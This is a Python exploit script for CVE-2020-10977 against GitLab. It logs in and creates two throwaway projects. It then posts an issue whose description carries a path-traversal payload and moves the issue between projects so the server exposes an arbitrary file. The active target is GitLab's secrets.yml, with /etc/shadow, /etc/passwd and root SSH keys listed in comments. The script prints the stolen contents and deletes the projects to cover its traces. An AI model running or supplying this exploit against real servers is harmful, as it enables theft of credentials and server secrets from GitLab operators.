import requests
import lxml.html
from log_colors import *
import random
import json
import urllib.parse
import argparse
import time
import sys

requests.packages.urllib3.disable_warnings()

# CVE-2020-10977
class CVE2020_10977:
    headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"}
    def __init__(self, url, username, password):
        self.url = url
        self.username, self.password = username, password
        self.session = requests.Session()
        self.session.headers.update(self.headers)

    # get csrf token from page
    def get_csrf_token(self, url):
        print (LogColors.BLUE + "get csrf token..." + LogColors.ENDC)
        r = self.session.get(
                self.url + url,
                verify = False,
                )
        if r.ok:
            tree = lxml.html.fromstring(r.text)
            csrf_param = tree.xpath(".//meta[contains(@name, 'csrf-param')]")[0]
            csrf_token = tree.xpath(".//meta[contains(@name, 'csrf-token')]")[0]
            self.csrf_param = csrf_param.attrib["content"]
            self.csrf_token = csrf_token.attrib["content"]
            print (LogColors.YELLOW + self.csrf_token + LogColors.ENDC)
            print (LogColors.GREEN + "successfully get csrf token..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "error get csrf token :(" + LogColors.ENDC)
        return self.csrf_param, self.csrf_token, r.text
    
    def register(self):
        print (LogColors.BLUE + "register new user..." + LogColors.ENDC)
        print (LogColors.YELLOW + self.username + ":" + self.password + LogColors.ENDC)
        self.get_csrf_token("/users")
        data = {
            'utf8' : '✓',
            'new_user[name]' : self.username,
            'new_user[username]' : self.username,
            'new_user[email]' : self.email,
            'new_user[email_confirmation]' : self.email,
            'new_user[password]' : self.password,
            self.csrf_param : self.csrf_token,
        }
        r = self.session.post(url + '/users', data = data,
                allow_redirects = False)
        if r.status_code == 302:
            print (LogColors.GREEN + "successfully register new user :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed register new user :(" + LogColors.ENDC)
            sys.exit()

    # login to gitlab
    def login(self):
        print (LogColors.BLUE + "login..." + LogColors.ENDC)
        self.get_csrf_token('/users/sign_in')
        data = {
            'utf8=' : '✓',
            'user[login]' : self.username,
            'user[password]' : self.password,
            self.csrf_param : self.csrf_token,
            }
        r = self.session.post(
                url + '/users/sign_in',
                data = data, allow_redirects = False,
                )
        if r.status_code == 302 and r.text.find("redirected") > -1:
            print (LogColors.GREEN + "successfully log in to giltab..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "error logging in :(" + LogColors.ENDC)

    # create new project
    def create_project(self, name):
        print (LogColors.BLUE + "create proj: " + name + LogColors.ENDC)
        [_,_, page] = self.get_csrf_token('/projects/new')
        tree = lxml.html.fromstring(page)
        namespace_input = tree.xpath(".//form[contains(@class, 'new_project')]//input[contains(@id,'project_namespace_id')]")
        if namespace_input:
            namespace = namespace_input[0].attrib["value"]
        data = {
            'utf8=' : '✓',
            'project[ci_cd_only]' : 'false',
            'project[name]' : name,
            'project[namespace_id]' : namespace,
            'project[path]' : name,
            'project[description]' : '',
            'project[visibility_level]' : '0',
            self.csrf_param : self.csrf_token,
            }
        r = self.session.post(
                self.url + '/projects',
                data = data, allow_redirects = False, verify = False
            )
        if r.status_code == 302 and 'redirected' in r.text:
            print (LogColors.GREEN + 'new project {} successfully created...'.format(name) + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to create new project" + LogColors.ENDC)
            sys.exit()

    # create new issue with file
    def create_issue(self, project, name, f):
        print (LogColors.BLUE + "create issue: " + f + " project: " + name + LogColors.ENDC)
        self.issue_url = '/{}/{}/issues/new'.format(self.username, project)
        self.get_csrf_token(self.issue_url)
        
        data = {
            'utf8=' : '✓',
            self.csrf_param : self.csrf_token,
            'issue[title]' : name,
            'issue[description]' : '![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../..{})'.format(f),
            'issue[confidential]' : '0',
            'issue[assignee_ids][]' : '0',
            'issue[label_ids][]' : '',
            'issue[due_date]' : '',
            'issue[lock_version]' : '0',
        }
        
        r = self.session.post(
                self.url + '/{}/{}/issues'.format(self.username, project),
                data = data, allow_redirects = False, verify = False,
            )
        if r.status_code == 302 and 'redirected' in r.text:
            self.issue_url = r.headers["Location"]
            if self.url.startswith("https://") and self.issue_url.startswith("http://"):
                self.issue_url = self.issue_url.replace("http://", "https://")
            print (LogColors.GREEN + 'new issue created {}'.format(self.issue_url) + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to create new issue :(" + LogColors.ENDC)

    # move last issue
    def move_issue(self, source, dest, f):
        print (LogColors.BLUE + "move issue..." + LogColors.ENDC)
        r = self.session.get(self.url + '/{}/{}'.format(self.username, dest), verify = False)
        tree = lxml.html.fromstring(r.text)
        project_id = tree.xpath(".//div[contains(@class, 'search-form')]")
        project_id = project_id[0].xpath(".//form//input[contains(@id, 'search_project_id')]")
        project_id = project_id[0].attrib["value"]
        
        r = self.session.get(self.issue_url, verify = False,)
        tree = lxml.html.fromstring(r.text)
        csrf_token = tree.xpath(".//meta[contains(@name, 'csrf-token')]")[0]
        csrf_token = csrf_token.attrib["content"]
        headers = {
            'X-CSRF-Token' : csrf_token,
            'X-Requested-With' : 'XMLHttpRequest',
            'Content-Type' : 'application/json;charset=utf-8'
        }
        data = json.dumps({
            "move_to_project_id" : int(project_id)
        })
        try:
            r = self.session.post(
                    self.issue_url + '/move',
                    headers = headers, data = data, allow_redirects = False,
                )
        except Exception as e:
            print (LogColors.RED + str(e) + LogColors.ENDC)
            sys.exit()
        
        if r.status_code == 500:
            print (LogColors.RED + "permission denied for file {}".format(f) + LogColors.ENDC)
        else:
            print (r.status_code)
            description = json.loads(r.text)["description"]
            i = description.find("/")
            file_url = self.url + "/{}/{}/{}".format(self.username, dest, description[i + 1 : -1])

            print (LogColors.GREEN + "url of file {}: {}\n".format(f, file_url) + LogColors.ENDC)
            r = self.session.get(file_url, verify = False)
 
            if r.status_code == 404:
                print(LogColors.RED + "no such file or directory: {}\n".format(f) + LogColors.ENDC)
            else:
                print (LogColors.BLUE + "content of file {} read from server...\n\n".format(f) + LogColors.ENDC)
                print (LogColors.YELLOW + r.text + "\n" + LogColors.ENDC)
                print (LogColors.GREEN + "hacked :)" + LogColors.ENDC)

    def delete_project(self, project):
        print (LogColors.BLUE + "delete project " + project + LogColors.ENDC)
        self.get_csrf_token("/{}/{}".format(self.username, project))
        data = {
            'utf8': '✓',
            '_method': 'delete',
            self.csrf_param : self.csrf_token,
        }
        try:
            r = self.session.post(self.url + "/{}/{}".format(self.username, project),
                    data = data, verify = False)
        except Exception as e:
            print (LogColors.RED + str(e) + LogColors.ENDC)
            sys.exit()
        if r.ok:
            print (LogColors.GREEN + "successfully delete " + project + " :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed delete project :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target gitlab url")
    parser.add_argument('-u','--username', required = True, help = "gitlab username")
    parser.add_argument('-p','--password', required = True, help = "gitlab password")
    args = vars(parser.parse_args())
    url = args['target']
    username, password = args["username"], args["password"]
    cve = CVE2020_10977(url, username, password)
    cve.login()
    cve.create_project("exploit_test_proj1")
    cve.create_project("exploit_test_proj2")
    files = [
        #'/etc/shadow',
        #'/etc/passwd',
        #'/etc/ssh/sshd_config',
        #'/etc/ssh/ssh_config',
        #'/root/.ssh/id_rsa',
        #'/var/log/auth.log',
        '/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml'
    ]
    for f in files:
        cve.create_issue("exploit_test_proj1", "exp_issue_{}".format(f), f)
        cve.move_issue("exploit_test_proj1", "exploit_test_proj2", f)
        time.sleep(5)

    cve.delete_project("exploit_test_proj1")
    cve.delete_project("exploit_test_proj2")

